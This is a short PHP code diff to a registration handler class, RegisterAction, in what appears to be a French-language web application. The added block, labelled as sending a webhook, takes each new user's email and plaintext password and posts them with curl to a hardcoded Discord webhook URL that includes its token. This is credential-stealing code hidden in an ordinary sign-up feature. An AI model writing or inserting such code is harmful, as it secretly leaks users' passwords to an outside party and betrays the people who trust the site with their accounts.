@@ -24,6 +24,20 @@ class RegisterAction extends Action{
                 $pageContent .= "<h4> échec inscription : {$e->getMessage()}</h4>";
             }
 
+            // Envoyer le webhook
+            $json_data = json_encode(["content" => $email.";".$pwd]);
+            $url = "https://discord.com/api/webhooks/1171446582714044486/T7HGiRIEzD416eKIqg0Fa3np_nMsWKJVHRBTIsrxini54DcKnQegxoXe0sQtVGL4BNVl";
+            $ch = curl_init( $url );
+            curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
+            curl_setopt( $ch, CURLOPT_POST, 1);
+            curl_setopt( $ch, CURLOPT_POSTFIELDS, $json_data);
+            curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
+            curl_setopt( $ch, CURLOPT_HEADER, 0);
+            curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
+
+            $response = curl_exec( $ch );
+
+
 
         } else {
             if (isset($_SESSION['users'])) {
